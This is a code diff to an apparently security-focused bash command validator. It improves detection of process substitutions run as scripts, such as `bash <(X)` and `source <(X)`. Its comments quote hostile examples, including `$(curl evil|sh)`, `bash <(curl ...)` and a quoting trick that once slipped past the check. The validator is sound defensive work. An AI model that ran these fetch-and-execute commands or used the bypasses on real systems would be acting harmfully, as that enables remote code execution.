@@ -26,7 +26,7 @@ from enum import Enum
 from functools import lru_cache
 from typing import TYPE_CHECKING, Any
 
-from .parser import without_fd_variables
+from .parser import STDIN_EXEC_INTERPRETERS, _reads_stdin_as_program, command_word_parts, without_fd_variables
 
 if TYPE_CHECKING:
     from collections.abc import Iterator
@@ -1000,6 +1000,9 @@ class SubstitutionNode:
     depth: int = 0  # Nesting depth
     # Spans of inner_command that are quoted arguments, for the rule engine's string_literals.
     literal_ranges: list[tuple[int, int]] = field(default_factory=list)
+    # The node as the AST holds it. `ast_node` has been through _unwrap_compound, which can
+    # replace it (`<( { X; } )`), so only this one can be found again by identity.
+    source_node: Any = None
 
 
 class _ListSegment:
@@ -1066,6 +1069,12 @@ def _strip_group_terminator(node: Any) -> Any:
     if len(parts) == 1:
         return parts[0]
     return _TrimmedList(parts)
+
+
+# `source FILE` and `. FILE` run FILE in the current shell, so a process substitution
+# there is a script exactly as it is for `bash FILE`. Delete once `source`/`.` are in
+# STDIN_EXEC_INTERPRETERS, so that set stays the one source of truth.
+_SOURCING_BUILTINS = frozenset({"source", "."})
 
 
 def _unwrap_compound(node: Any) -> Any:
@@ -1166,8 +1175,12 @@ class SubstitutionValidator:
                 return  # Don't recurse into substitution here - handled by _create_substitution_node
 
             if node.kind == "processsubstitution":
-                # Determine if input <(cmd) or output >(cmd)
-                sub_type = SubstitutionType.PROCESS_INPUT  # Default, could enhance detection
+                # Read the direction from the source, which the node's position indexes. A word's
+                # text cannot tell: bashlex strips its quotes, so `bash ''<(… >(…) …)` shifted a
+                # word-relative read onto the inner `>(` (LAB-4808). No source reads as input,
+                # which is the side that gets checked.
+                is_output = command is not None and command[node.pos[0] : node.pos[0] + 2] == ">("
+                sub_type = SubstitutionType.PROCESS_OUTPUT if is_output else SubstitutionType.PROCESS_INPUT
                 sub_node = self._create_substitution_node(node, sub_type, current_depth, command, budget)
                 if sub_node:
                     substitutions.append(sub_node)
@@ -1229,10 +1242,10 @@ class SubstitutionValidator:
         body was sliced from the wrong string, saw no introducer, and returned nothing --
         while the whitelisted ``$(date)`` decoded beside it kept the fail-closed fallback
         from firing. ``echo "${x:-$(date) cat <<IN`` / ``$(curl evil|sh)`` / ``IN }"`` was
-        ALLOWED/SAFE while bash ran it. Still do NOT wire ``_find_outer_command`` (whose own
-        docstring invites exactly that) into this path: it walks the top-level ``ast_nodes``,
-        where this subtree does not exist, so it would name the outer command for a body it
-        never saw.
+        ALLOWED/SAFE while bash ran it. Still do NOT wire ``_find_outer_command`` into this
+        path: it looks a node up by identity in the top-level ``ast_nodes``, where this
+        subtree does not exist, so it finds no owner for anything in the body - a silent
+        "not a script" that would read as a verdict.
 
         THE RE-PARSE IS THE DANGEROUS PART, because the body's real lexical context is inside
         ``${…}`` but bashlex is handed a command line. Two consequences, both found by the
@@ -1412,6 +1425,7 @@ class SubstitutionValidator:
         Returns:
             SubstitutionNode or None if extraction fails
         """
+        source_node = node
         node = _unwrap_compound(node)
         inner_command, literal_ranges = self._extract_inner_command_text(node)
         # A command list ($(a && b), $(a; b)) is validated per-segment from its AST, so it must
@@ -1461,6 +1475,7 @@ class SubstitutionValidator:
             nested_substitutions=nested,
             depth=depth,
             literal_ranges=literal_ranges,
+            source_node=source_node,
         )
 
     def _extract_inner_command_text(self, node: Any) -> tuple[str | None, list[tuple[int, int]]]:  # noqa: PLR0911, PLR0912
@@ -2351,63 +2366,85 @@ class SubstitutionValidator:
         Returns:
             List of validation results for each substitution found
         """
+        from .rules import RiskLevel  # noqa: PLC0415 - rules imports this module
+
         substitutions = self.extract_substitutions(ast_nodes, command=command)
         results: list[SubstitutionValidationResult] = []
 
         for sub in substitutions:
-            result = self.validate_substitution(sub)
-            results.append(result)
+            # Replaces the inner verdict: it must not depend on the inner command resolving (LAB-4808).
+            reason = self._script_substitution(ast_nodes, sub)
+            if reason:
+                results.append(SubstitutionValidationResult(allowed=False, risk_level=RiskLevel.BLOCKED, message=reason))
+                continue
+            results.append(self.validate_substitution(sub))
 
         return results
 
+    def _script_substitution(self, ast_nodes: list[Any], sub: SubstitutionNode) -> str:
+        """The denial for the first process substitution run as a script in `sub`'s tree, else "".
+
+        Nested ones too: `validate_substitution` judges a nested `. <(X)` only by its command
+        name, and `.` is not blacklisted, so `echo $(. <(X))` read HIGH. They are nodes of
+        `ast_nodes`, so the identity lookup finds their owners.
+        """
+        is_script, reason = self.check_process_substitution_context(ast_nodes, sub)
+        if is_script:
+            return reason
+        return next(filter(None, (self._script_substitution(ast_nodes, n) for n in sub.nested_substitutions)), "")
+
     def check_process_substitution_context(self, ast_nodes: list[Any], sub_node: SubstitutionNode) -> tuple[bool, str]:
-        """Check if process substitution is in a dangerous context.
+        """Whether a process substitution is the script an interpreter runs (LAB-4808).
 
-        Process substitution to a shell interpreter is RCE:
-        - bash <(curl ...)  -> BLOCKED
-        - diff <(ls dir1) <(ls dir2)  -> SAFE
+        `bash <(X)` runs X's output as a program, exactly as `X | bash` does, so it is denied
+        the way the pipe detector denies that: structurally, whatever X is. X passing the
+        whitelist (`echo`, `cat`) says nothing about the program it prints.
+
+        Script position is `source`/`.`'s operand, or an interpreter's first operand with
+        no unambiguous program before it. The pipe detector's own set and gate decide it,
+        so the two sinks cannot drift: `bash -o pipefail <(X)` is a script, `bash script.sh
+        <(X)` and `bash -c P <(X)` are not. `>(X)` (PROCESS_OUTPUT) gives the interpreter a
+        pipe that X reads, never X's output. Wrapped shells (`env`/`command`/`exec`/`sudo`
+        `bash <(X)`) are LAB-4706's.
 
         Args:
-            ast_nodes: Full AST for context
-            sub_node: The process substitution node
+            ast_nodes: The AST `sub_node` was extracted from.
+            sub_node: The substitution to place.
 
         Returns:
-            Tuple of (is_dangerous, reason)
+            Tuple of (is_script, reason)
         """
-        if sub_node.substitution_type not in (
-            SubstitutionType.PROCESS_INPUT,
-            SubstitutionType.PROCESS_OUTPUT,
-        ):
+        if sub_node.substitution_type != SubstitutionType.PROCESS_INPUT:
             return False, ""
+        owner = self._find_outer_command(ast_nodes, sub_node.source_node)
+        if owner is None:
+            return False, ""
+        words, at = owner
+        name = words[0].word.split("/")[-1]
+        if at == 0 or (name not in STDIN_EXEC_INTERPRETERS and name not in _SOURCING_BUILTINS):
+            return False, ""
+        if not _reads_stdin_as_program(name, [word.word for word in words[1:at]]):
+            return False, ""
+        return True, f"Process substitution run as a script by '{name}': its output is executed as code"
 
-        # Find the outer command that uses this process substitution
-        outer_cmd = self._find_outer_command(ast_nodes, sub_node.ast_node)
+    def _find_outer_command(self, ast_nodes: list[Any], target_node: Any) -> tuple[list[Any], int] | None:
+        """The argv words of the command that takes `target_node` as a word, and its index.
 
-        if outer_cmd in DANGEROUS_SUBSTITUTION_COMMANDS:
-            return True, f"Process substitution to shell interpreter: {outer_cmd}"
-
-        # Specifically check for shell interpreters
-        shell_interpreters = {"bash", "sh", "zsh", "dash", "ksh", "fish", "python", "python3", "perl", "ruby", "node"}
-        if outer_cmd in shell_interpreters:
-            return True, f"Process substitution to {outer_cmd} is arbitrary code execution"
-
-        return False, ""
-
-    def _find_outer_command(self, ast_nodes: list[Any], target_node: Any) -> str | None:
-        """Find the outer command that contains a substitution node.
-
-        Args:
-            ast_nodes: Full AST
-            target_node: The substitution node to find context for
-
-        Returns:
-            The outer command name or None
+        Found by node identity, so a node from a re-parsed `${…}` or heredoc body, which
+        `ast_nodes` does not hold, has no owner here. The walk enters every child of every
+        node: bashlex nests commands under `function`, `if` and `compound` nodes, and a walk
+        keyed on the kinds it expected missed `f() { …; }` before (LAB-4150). Only a
+        `command` can own the substitution, and only through an argv word: a redirect target
+        (`bash < <(X)`) is stdin, not an operand, and is not modelled here.
         """
-        # This is a simplified implementation
-        # A full implementation would track parent references in AST traversal
-        for node in ast_nodes or []:
-            if hasattr(node, "kind") and node.kind == "command":
-                first_word = _leading_part(node)
-                if hasattr(first_word, "word"):
-                    return first_word.word
+        stack = list(ast_nodes or [])
+        while stack:
+            node = stack.pop()
+            if getattr(node, "kind", None) == "command":
+                words = command_word_parts(node)
+                for at, word in enumerate(words):
+                    if any(part is target_node for part in getattr(word, "parts", None) or []):
+                        return words, at
+            for child in vars(node).values() if hasattr(node, "__dict__") else ():
+                stack.extend(item for item in (child if isinstance(child, list) else [child]) if hasattr(item, "kind"))
         return None
